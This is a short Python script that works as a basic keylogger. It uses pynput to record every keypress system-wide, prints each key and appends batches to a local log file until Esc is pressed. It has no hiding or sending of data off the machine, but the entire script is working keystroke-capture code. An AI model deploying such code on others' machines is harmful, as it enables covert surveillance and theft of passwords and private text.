import pynput
from pynput.keyboard import Key, Listener
import datetime
import time

unix_time = int(time.mktime(datetime.datetime.now().timetuple()))

count = 0
keys = []


def on_press(key):
    """Reset the `count` to zero, and transfer the data in `keys` while clearing the list."""
    global keys, count
    keys.append(key)
    count += 1
    print(f"{key} pressed")

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    """Save the keystrokes to a textfile with `log_[CURRENT UNIX TIME].txt` format."""
    with open(f"log_{unix_time}.txt", "a") as file:
        for key in keys:
            k = str(key).replace("'", "\n")
            if k.find("space") > 0:
                file.write("")
            elif k.find("Key") == -1:
                file.write(k)


def on_release(key):
    """Kill the program on hitting the `Esc` button."""
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
